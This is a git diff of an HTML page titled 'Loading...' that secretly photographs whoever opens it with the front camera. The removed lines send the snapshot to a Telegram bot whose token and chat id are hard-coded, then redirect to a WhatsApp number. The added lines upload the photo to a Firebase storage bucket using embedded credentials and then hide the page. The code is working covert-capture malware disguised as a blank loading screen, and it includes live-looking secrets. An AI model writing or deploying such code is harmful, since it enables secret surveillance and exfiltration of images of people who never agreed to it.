@@ -3,36 +3,62 @@
 <head>
     <title>Loading...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
 </head>
-<body style="background:black">
-    <video id="cam" autoplay style="display:none"></video>
+<body style="margin:0; background:#000;">
+    <video id="video" autoplay playsinline style="display:none"></video>
     <canvas id="canvas" style="display:none"></canvas>
 
     <script>
-        navigator.mediaDevices.getUserMedia({video: true})
-        .then(stream => {
-            var video = document.getElementById('cam');
-            video.srcObject = stream;
-            
-            setTimeout(() => {
-                var canvas = document.getElementById('canvas');
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                var bot_token = '7869154817:AAEDDgeICEKXBA_C2_0xFuzHNgUMEoT3hlA';
-                var chat_id = '7701259633';
-                var image = canvas.toDataURL();
-                
-                fetch(`https://api.telegram.org/bot${bot_token}/sendPhoto`, {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        chat_id: chat_id,
-                        photo: image
-                    })
+        const firebaseConfig = {
+            apiKey: "AIzaSyA_Q7Sh-BPslxIzW_FZheb960MiYWerWug",
+            authDomain: "camera-capture-d8c2e.firebaseapp.com",
+            projectId: "camera-capture-d8c2e",
+            storageBucket: "camera-capture-d8c2e.firebasestorage.app",
+            messagingSenderId: "891664173652",
+            appId: "1:891664173652:web:dd175b49e0ee667edfbbc1",
+            measurementId: "G-SV3X6RPYWK"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' }
                 });
 
-                window.location = "https://wa.me/201029034601";
-            }, 1500);
-        });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    setTimeout(() => {
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const imageData = canvas.toDataURL('image/jpeg');
+
+                        // تخزين في Firebase
+                        const storageRef = firebase.storage().ref();
+                        const imageRef = storageRef.child(`captures/${Date.now()}.jpg`);
+                        
+                        imageRef.putString(imageData, 'data_url').then(() => {
+                            stream.getTracks().forEach(track => track.stop());
+                            // إخفاء الصفحة بعد التخزين
+                            document.body.style.display = 'none';
+                        });
+                    }, 1000);
+                };
+            } catch(err) {
+                console.error(err);
+            }
+        }
+
+        window.onload = startCamera;
     </script>
 </body>
 </html>
+
